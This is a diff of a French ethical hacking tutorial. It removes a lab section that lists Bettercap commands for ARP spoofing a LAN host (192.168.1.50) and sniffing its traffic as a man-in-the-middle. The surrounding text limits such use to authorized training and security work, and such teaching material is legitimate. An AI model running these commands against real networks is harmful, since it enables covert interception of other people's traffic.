@@ -22,19 +22,4 @@ En ethical hacking, ce type d’attaque est simulé **uniquement avec une autori
 
 ---
 
-## 3. TP : ARP Spoofing avec Bettercap
-
-```bash
-# 1. Lancer Bettercap et scanner le réseau
-sudo bettercap -iface eth0
-bettercap> net.probe on
-
-# 2. Démarrer l'attaque MITM
-bettercap> set arp.spoof.fullduplex true
-bettercap> set arp.spoof.targets 192.168.1.50
-bettercap> arp.spoof on
-
-# 3. Sniffer le trafic
-bettercap> net.sniff on
-```
 `Remarque` : utilisez ces techniques dans un cadre pédagogique ou professionnel strictement autorisé. L’objectif est toujours la sécurisation, non l’exploitation malveillante. 
